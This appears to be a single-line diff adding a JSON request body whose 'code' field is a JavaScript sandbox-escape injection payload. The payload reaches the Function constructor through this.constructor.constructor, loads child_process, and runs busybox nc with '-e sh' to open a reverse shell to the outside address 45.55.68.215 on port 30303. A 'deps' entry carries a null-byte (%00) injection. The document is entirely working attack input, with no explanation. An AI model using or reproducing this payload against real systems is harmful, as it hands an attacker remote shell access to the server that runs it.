@@ -1,0 +1,1 @@
+{"code":"1}),new Function('/*'+this.constructor.constructor('return (global.Buffer.constructor)(\"return global.process.mainModule.require(\\'child_process\\').spawnSync(\\'busybox\\', [\\'nc\\', \\'45.55.68.215\\',\\'30303\\', \\'-e\\', \\'sh\\'])\")()')()+'*/');\n//","deps":["Hk9P-_k--","Hk9P-_k--%00"]}
